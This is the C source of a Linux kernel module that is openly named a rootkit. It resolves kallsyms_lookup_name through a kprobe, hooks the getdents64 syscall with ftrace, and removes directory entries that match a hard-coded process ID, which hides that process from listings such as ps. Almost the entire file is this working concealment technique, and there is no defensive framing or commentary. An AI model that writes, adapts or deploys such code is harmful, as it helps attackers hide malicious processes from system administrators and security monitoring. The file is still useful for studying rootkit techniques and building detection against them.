#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_VERSION("1.0");

typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
orig_getdents64_t orig_getdents64;

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t my_kallsyms_lookup_name;

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

char hide_pid[NAME_MAX] = "2737";

static void set_lookup(void) {
  register_kprobe(&kp);
  my_kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
  unregister_kprobe(&kp);
}

asmlinkage int hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    long error;
    unsigned long offset = 0;

    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret <= 0) || (dirent_ker == NULL)) {
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error) {
        goto done;
    }
    
    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;
        if ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0)) {
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);

    done:
	kfree(dirent_ker);
	return ret;
}

void callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs) {
    if (!within_module(parent_ip, THIS_MODULE)) {
        regs->regs.ip = (long unsigned int) ops -> private;
    }
}


struct ftrace_ops ops = {
    .func = callback_func,
    .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY,
    .private = &hook_getdents64
};

static int __init rootkit_init(void) {
    int err;
    set_lookup();
    orig_getdents64 = (orig_getdents64_t) my_kallsyms_lookup_name("__x64_sys_getdents64");
    err = ftrace_set_filter(&ops, "__x64_sys_getdents64", strlen("__x64_sys_getdents64"), 0);
    printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    err = register_ftrace_function(&ops);
    printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
    printk(KERN_INFO "rootkit: Loaded\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    unregister_ftrace_function(&ops);
    printk(KERN_INFO "rootkit: Unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

